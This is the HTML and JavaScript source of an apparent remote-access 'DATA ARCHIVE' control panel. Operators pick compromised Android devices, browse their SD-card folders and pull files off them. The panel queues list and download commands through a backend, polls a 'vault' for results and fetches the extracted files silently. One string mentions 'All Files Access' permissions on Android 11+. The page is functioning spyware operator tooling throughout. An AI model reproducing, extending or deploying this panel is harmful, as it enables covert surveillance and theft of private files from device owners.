<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TESVRIX · DATA ARCHIVE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-glow: rgba(225, 29, 72, 0.45);
            --bg-deep: #020617;
            --bg-surface: #0f172a;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-blue: #3b82f6;
            --accent-green: #10b981;
            --glass-border: rgba(255, 255, 255, 0.08);
            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            background: radial-gradient(ellipse at 20% 30%, #0a0f1f, var(--bg-deep));
            font-family: 'Inter', sans-serif;
            color: var(--text-primary);
            height: 100vh;
            overflow: hidden;
            padding: 15px;
            display: flex;
            flex-direction: column;
        }

        .main-card {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(25px);
            border-radius: 32px;
            border: 1px solid var(--glass-border);
            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.8);
            overflow: hidden;
            position: relative;
        }

        /* HEADER */
        .header {
            padding: 20px 30px;
            background: linear-gradient(90deg, rgba(225,29,72,0.15), transparent);
            border-bottom: 1px solid rgba(255,255,255,0.08);
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 200; /* Ensure header is always on top */
        }

        .node-selector {
            background: rgba(0,0,0,0.6);
            border: 1px solid var(--primary);
            color: #fff;
            padding: 8px 15px;
            border-radius: 12px;
            font-family: 'Space Grotesk';
            font-size: 0.8rem;
            outline: none;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(225, 29, 72, 0.2);
            min-width: 180px;
        }

        .header-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .header-title i {
            font-size: 1.5rem;
            color: var(--primary);
            filter: drop-shadow(0 0 10px var(--primary-glow));
        }

        .header-title h1 {
            font-family: 'Space Grotesk';
            font-size: 1.1rem;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        /* TOOLBAR */
        .toolbar {
            padding: 10px 20px;
            background: rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .btn-tool {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            width: 38px;
            height: 38px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: var(--transition);
        }

        .btn-tool:hover {
            background: var(--primary);
            border-color: transparent;
            transform: translateY(-2px);
        }

        .path-box {
            flex: 1;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.05);
            padding: 8px 15px;
            border-radius: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--accent-blue);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .sync-btn {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 8px 20px;
            border-radius: 12px;
            font-family: 'Space Grotesk';
            font-weight: 700;
            font-size: 0.75rem;
            letter-spacing: 1px;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sync-btn:hover {
            box-shadow: 0 0 20px var(--primary-glow);
            transform: scale(1.02);
        }

        /* FILE LIST */
        .list-container {
            flex: 1;
            overflow-y: auto;
            padding: 5px 0;
            position: relative;
        }

        .list-header {
            display: grid;
            grid-template-columns: 60px 1fr 120px 180px 100px;
            padding: 10px 30px;
            font-size: 0.65rem;
            font-weight: 800;
            text-transform: uppercase;
            color: var(--text-secondary);
            letter-spacing: 1px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            position: sticky;
            top: 0;
            background: var(--bg-surface);
            z-index: 5;
        }

        .file-item {
            display: grid;
            grid-template-columns: 60px 1fr 120px 180px 100px;
            align-items: center;
            padding: 14px 30px;
            border-bottom: 1px solid rgba(255,255,255,0.02);
            transition: var(--transition);
            cursor: pointer;
        }

        .file-item:hover {
            background: rgba(225, 29, 72, 0.05);
            border-left: 3px solid var(--primary);
            padding-left: 27px;
            box-shadow: inset 0 0 20px rgba(225,29,72,0.03);
        }

        .file-icon {
            font-size: 1.2rem;
            text-align: center;
        }

        .icon-folder { color: #fbbf24; filter: drop-shadow(0 0 5px rgba(251, 191, 36, 0.3)); }
        .icon-file { color: #94a3b8; }
        .icon-image { color: #10b981; }
        .icon-video { color: #ef4444; }

        .file-name {
            font-size: 0.85rem;
            font-weight: 500;
            color: #e2e8f0;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .file-meta {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-secondary);
        }

        .download-btn {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            width: 38px;
            height: 38px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
            margin: 0 auto;
            position: relative;
            overflow: hidden;
        }

        .download-btn:hover {
            background: var(--accent-green);
            border-color: transparent;
            color: #000;
        }

        .download-btn.active {
            border-color: var(--accent-green);
            background: rgba(16, 185, 129, 0.1);
        }

        /* Pulse Animation instead of Timer */
        .pulse-loader {
            position: absolute;
            inset: 0;
            background: var(--accent-green);
            opacity: 0;
            animation: btn-pulse 1.5s infinite;
            pointer-events: none;
        }

        @keyframes btn-pulse {
            0% { transform: scale(0.5); opacity: 0.5; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        /* LOADER OVERLAY Fix: Ensure it doesn't block header */
        .loader-overlay {
            position: absolute;
            top: 130px; /* Offset to keep header interactive */
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(2, 6, 23, 0.7);
            backdrop-filter: blur(5px);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 100;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 3px solid rgba(225, 29, 72, 0.1);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .loader-text {
            margin-top: 20px;
            font-family: 'Space Grotesk';
            font-size: 0.75rem;
            letter-spacing: 3px;
            color: var(--primary);
            text-transform: uppercase;
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }

        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 100px;
            color: var(--text-secondary);
            text-align: center;
        }

        .empty-state i {
            font-size: 3rem;
            margin-bottom: 20px;
            opacity: 0.2;
        }

        .empty-state p {
            font-family: 'Space Grotesk';
            font-size: 0.8rem;
            letter-spacing: 1px;
        }

        /* UNIVERSAL MOBILE RESPONSIVE FIX */
        @media (max-width: 992px) {
            body { padding: 10px; height: auto !important; min-height: 100vh; overflow-y: auto !important; }
            .split-left, .split-right, .modal-window { backdrop-filter: none !important; -webkit-backdrop-filter: none !important; background-color: rgba(15, 23, 42, 0.98); } /* Performance fix */
            .dashboard, .cam-container, .main-card, .container, .app-container, .split-layout {
                flex-direction: column !important;
                height: auto !important;
                min-height: 100vh;
                width: 100% !important;
                max-width: 100% !important;
                margin: 0 !important;
                border-radius: 16px !important;
            }
            .device-panel, .detail-panel, .sidebar, .main-area, .view-area, .gallery, .split-left, .split-right, .left-panel, .right-panel {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                flex: none !important;
                min-height: 200px;
                border-right: none !important;
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }
            .stats-grid, .perm-list, .grid-container {
                grid-template-columns: 1fr !important;
            }
            .header, .panel-header, .controls {
                flex-wrap: wrap;
                gap: 10px;
            }
            .node-selector, .search-field {
                width: 100% !important;
                min-width: 100% !important;
            }
            .stat-tile { margin-bottom: 10px; }
        }


        /* PREMIUM SCROLLBAR */
        ::-webkit-scrollbar { width: 10px !important; height: 10px !important; }
        ::-webkit-scrollbar-track { background: rgba(2, 6, 23, 0.6) !important; border-radius: 10px !important; }
        ::-webkit-scrollbar-thumb {
            background: #e11d48 !important;
            border-radius: 10px !important;
            border: 3px solid rgba(2, 6, 23, 0.6) !important;
        }
        ::-webkit-scrollbar-thumb:hover { background: #f43f5e !important; }

    </style>
</head>
<body>
    <div class="main-card">
        <iframe id="downloadFrame" style="display:none;"></iframe>
        <div class="loader-overlay" id="loader">
            <div class="spinner"></div>
            <div class="loader-text" id="loaderText">TRAVERSING FILESYSTEM</div>
        </div>

        <div class="header">
            <div class="header-title">
                <i class="fas fa-database"></i>
                <h1>DATA ARCHIVE</h1>
            </div>
            <select id="deviceSelector" class="node-selector"></select>
            <button class="sync-btn" onclick="refreshList()">
                <i class="fas fa-sync-alt"></i> SYNC REPOSITORY
            </button>
        </div>

        <div class="toolbar">
            <button class="btn-tool" onclick="goUp()" title="Back"><i class="fas fa-level-up-alt"></i></button>
            <button class="btn-tool" onclick="navigateTo('/')" title="Root"><i class="fas fa-hdd"></i></button>
            <div class="path-box">
                <i class="fas fa-terminal" style="color: var(--primary);"></i>
                <span id="currentPath">/SDCARD</span>
            </div>
        </div>

        <div class="list-container">
            <div class="list-header">
                <div>Type</div>
                <div>Filename</div>
                <div>Size</div>
                <div>Modified</div>
                <div style="text-align: center;">Action</div>
            </div>
            <div id="fileList">
                <div class="empty-state">
                    <i class="fas fa-satellite-dish"></i>
                    <p>ESTABLISH UPLINK TO EXPLORE NODE STORAGE</p>
                </div>
            </div>
        </div>
    </div>

    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    <script>
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let selectedId = null;
        let currentPath = "";
        let lastDownloadTime = 0;

        async function fetchDevices() {
            try {
                // Method 1: Filtered fetch
                let url = getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`);
                let r = await fetch(url, { headers: getApiHeaders() });
                let data = await r.json();

                // Method 2: Global fetch if filtered returns empty
                if (!Array.isArray(data) || data.length === 0) {
                    url = getApiUrl("devices?order=last_seen.desc");
                    r = await fetch(url, { headers: getApiHeaders() });
                    data = await r.json();
                }

                if (Array.isArray(data)) {
                    const sel = document.getElementById('deviceSelector');
                    sel.innerHTML = data.map(d => {
                        const lastSeen = new Date(d.last_seen).getTime();
                        const isOnline = (Date.now() - lastSeen) < 60000;
                        const statusDot = isOnline ? "🟢" : "🔴";
                        return `<option value="${d.device_uuid}" ${d.device_uuid === selectedId ? 'selected' : ''}>${statusDot} ${d.device_name || 'NODE'}</option>`;
                    }).join('');

                    if (data.length > 0) {
                        if (!selectedId) selectedId = data[0].device_uuid;
                        // Trigger initial load if selected
                        const list = document.getElementById('fileList');
                        if (list && list.querySelector('.empty-state')) {
                            refreshList();
                        }
                    }
                }
            } catch (e) {
                console.error("Device fetch failed:", e);
            }
        }

        document.getElementById('deviceSelector').onchange = (e) => {
            selectedId = e.target.value;
            refreshList();
        };

        function getParentSelectedId() {
            try {
                const parentId = window.parent.document.querySelector('[data-active-id]')?.getAttribute('data-active-id');
                if (parentId) {
                    selectedId = parentId;
                    fetchDevices();
                } else {
                    fetchDevices();
                }
            } catch(e) {
                fetchDevices();
            }
        }
        setTimeout(getParentSelectedId, 500);

        async function refreshList() {
            if (!selectedId) return;
            showLoader("SYNCING DIRECTORY...");
            try {
                await fetch(getApiUrl("vault?device_uuid=eq." + selectedId + "&type=eq.file_list_data"), { method: 'DELETE', headers: getApiHeaders() });

                const body = {
                    device_uuid: selectedId,
                    type: '/file_manager',
                    data: JSON.stringify({ command: 'list', path: currentPath }),
                    operator_id: auth.operator_id,
                    status: 'pending'
                };
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body: JSON.stringify(body) });
                startPollingList();
            } catch (e) {
                hideLoader();
                alert("Signal failure");
            }
        }

        function startPollingList() {
            let attempts = 0;
            const startTime = Date.now();
            const interval = setInterval(async () => {
                attempts++;
                try {
                    const r = await fetch(getApiUrl("vault?device_uuid=eq." + selectedId + "&type=eq.file_list_data&order=created_at.desc&limit=1"), { headers: getApiHeaders() });
                    const data = await r.json();

                    if (data && data.length > 0) {
                        const entryTime = new Date(data[0].created_at).getTime();
                        if (entryTime > startTime - 5000) {
                            clearInterval(interval);
                            const content = JSON.parse(data[0].content);
                            renderFiles(content);
                            hideLoader();
                        }
                    }
                } catch (e) {}

                if (attempts > 20) {
                    clearInterval(interval);
                    hideLoader();
                    alert("Node response timed out");
                }
            }, 1000);
        }

        function renderFiles(data) {
            const list = document.getElementById('fileList');

            const files = Array.isArray(data) ? data : (data.files || []);

            if (files.length > 0 && files[0].path) {
                let p = files[0].path;
                currentPath = p.substring(0, p.lastIndexOf('/')) || "/";
            }

            document.getElementById('currentPath').innerText = currentPath.toUpperCase();

            if (files.length === 0) {
                list.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-folder-open"></i>
                        <p>DIRECTORY IS EMPTY OR ACCESS DENIED</p>
                        <small style="font-size:0.6rem; opacity:0.6; margin-top:10px;">Check node permissions (All Files Access) on Android 11+</small>
                    </div>`;
                return;
            }

            const sorted = files.sort((a, b) => (b.isDir || b.d) - (a.isDir || a.d) || (a.name || a.n).localeCompare(b.name || b.n));

            list.innerHTML = sorted.map(f => {
                const name = f.name || f.n;
                const isDir = f.isDir || f.d;
                const path = f.path || f.p;
                const size = f.readableSize || f.hsize || formatSize(f.size || f.s);

                let icon = 'fas fa-file icon-file';
                if (isDir) icon = 'fas fa-folder icon-folder';
                else if (/\.(jpg|jpeg|png|gif|webp)$/i.test(name)) icon = 'fas fa-file-image icon-image';
                else if (/\.(mp4|mkv|mov|avi)$/i.test(name)) icon = 'fas fa-file-video icon-video';
                else if (/\.(mp3|wav|ogg)$/i.test(name)) icon = 'fas fa-file-audio icon-audio';

                return `
                <div class="file-item" onclick="${isDir ? `navigateTo('${path}')` : ''}">
                    <div class="file-icon"><i class="${icon}"></i></div>
                    <div class="file-name">${name}</div>
                    <div class="file-meta">${isDir ? '---' : size}</div>
                    <div class="file-meta">STABLE</div>
                    <div>
                        ${isDir ? '' : `<button id="btn-${btoa(name).replace(/=/g,'')}" class="download-btn" onclick="event.stopPropagation(); downloadFile('${path}', '${btoa(name).replace(/=/g,'')}')"><i class="fas fa-cloud-download-alt"></i></button>`}
                    </div>
                </div>
            `}).join('');
        }

        function navigateTo(path) {
            currentPath = path.replace(/\/+/g, '/');
            refreshList();
        }

        function goUp() {
            if (!currentPath || currentPath === "/" || currentPath.endsWith("/0")) return;
            const parts = currentPath.split('/');
            parts.pop();
            currentPath = parts.join('/') || "/";
            refreshList();
        }

        async function downloadFile(path, btnId) {
            if (!selectedId) return;

            const btn = document.getElementById(`btn-${btnId}`);
            if (btn) {
                btn.classList.add('active');
                btn.disabled = true;
                btn.innerHTML = '<div class="pulse-loader"></div><i class="fas fa-sync fa-spin"></i>';
            }

            try {
                await fetch(getApiUrl("vault?device_uuid=eq." + selectedId + "&type=eq.file_download_link"), { method: 'DELETE', headers: getApiHeaders() });

                const body = {
                    device_uuid: selectedId,
                    type: '/file_manager',
                    data: JSON.stringify({ command: 'download', path: path }),
                    operator_id: auth.operator_id,
                    status: 'pending'
                };

                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body: JSON.stringify(body) });

                startPollingDownload(btnId, path.split('/').pop());
            } catch (e) {
                resetBtn(btnId);
            }
        }

        function resetBtn(btnId) {
            const btn = document.getElementById(`btn-${btnId}`);
            if (btn) {
                btn.classList.remove('active');
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-cloud-download-alt"></i>';
            }
        }

        function startPollingDownload(btnId, fileName) {
            let attempts = 0;
            const startTime = Date.now();
            const interval = setInterval(async () => {
                attempts++;

                try {
                    const r = await fetch(getApiUrl("vault?device_uuid=eq." + selectedId + "&type=eq.file_download_link&order=created_at.desc&limit=1"), { headers: getApiHeaders() });
                    const data = await r.json();

                    if (data && data.length > 0) {
                        const entryTime = new Date(data[0].created_at).getTime();
                        if (entryTime > startTime - 5000) {
                            clearInterval(interval);
                            const btn = document.getElementById(`btn-${btnId}`);
                            if (btn) {
                                btn.innerHTML = '<i class="fas fa-check" style="color:var(--accent-green)"></i>';
                            }

                            executeDownload(data[0].id, fileName);
                            setTimeout(() => resetBtn(btnId), 3000);
                        }
                    }
                } catch (e) {}

                if (attempts > 1200) {
                    clearInterval(interval);
                    resetBtn(btnId);
                    alert("Extraction timed out.");
                }
            }, 1000);
        }

        async function executeDownload(id, name) {
            try {
                const dlUrl = getDownloadUrl(id, name);
                const frame = document.getElementById('downloadFrame');
                if (frame) {
                    frame.src = dlUrl;
                } else {
                    window.open(dlUrl, '_blank');
                }
            } catch (e) {
                console.error("Download Error:", e);
            }
        }

        function formatSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }

        function showLoader(text) {
            document.getElementById('loaderText').innerText = text;
            document.getElementById('loader').style.display = 'flex';
        }
        function hideLoader() { document.getElementById('loader').style.display = 'none'; }

         // Periodic Refresh for Device Status
        setInterval(fetchDevices, 10000);
    </script>
</body>
</html>
